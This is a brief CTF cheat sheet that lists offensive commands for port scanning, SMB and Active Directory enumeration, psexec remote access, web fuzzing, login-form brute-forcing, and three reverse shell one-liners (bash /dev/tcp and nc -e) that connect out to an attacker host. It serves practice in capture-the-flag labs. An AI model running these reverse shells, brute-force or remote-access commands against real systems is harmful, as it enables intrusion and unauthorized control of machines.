---
title: CTF Cheat Sheet
---

**Tagline:** *Everyday Hacks to Elite Attacks — Cyber Warfare. Ghost Ops. Red Team Tactics. HaxrByte.*

# CTF CheatSheet

### UPDATE DATE: 27 Nov 2025
* TOC
{:toc}

# PortScan

```bash
sudo rustscan -a <hostname> -- -sCV -oA <filename>
```

# SMB

```bash
smbclient -L //<target> -U <username>%<password>
```
```bash
smbclient //<target>/<share> -U <username>%<password>
```

# BloodHound

```bash
sudo ./bloodhound containers start
```

## RustHound

```bash
rusthound-ce --domain <domain_name> -u <username> -p <password>
```

# Remote Access

```bash
impacket-psexec <domain_name>/<username>:'<password>'@<target>
```

# Web Server

```bash
python3 -m http.server <8080:port> -d <directory>
```

# Web Enumeration

## Files or Directories
```bash
dirsearch -u http://<target>
```
```bash
gobuster dir -u http://<target> -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html
```
```bash
dirb http://<target>
```
```bash
ffuf -u "http://<target>/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php,.aspx,.html,.txt
```
```bash
feroxbuster -u https://<target>
```

## Vhosts or SubDomains
```bash
gobuster vhost -u http://<target> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```
```bash
ffuf -u http://<target> -H "Host: FUZZ.<domain_name>" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000 -ic -c -fs <size>
```

## Brute Force Login Form
```bash
ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
```

# Vulnerability Scanner
```bash
nuclei -u <target>
```

# SHELLS

## Listener
```bash
rlwrap nc -nvlp <8080:port>
```
rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].

## Reverse Shell
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
```bash
'bash -c "bash -i >& /dev/tcp/<attachet_ip>/<8080:port> 0>&1"'
```
```bash
nc -e /bin/sh <attacker_ip> <8080:port>
```

## Full TTYs
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

# Walkthroughs
```bash
https://0xdf.gitlab.io/
```

# Resources
```bash
https://gtfobins.github.io/
```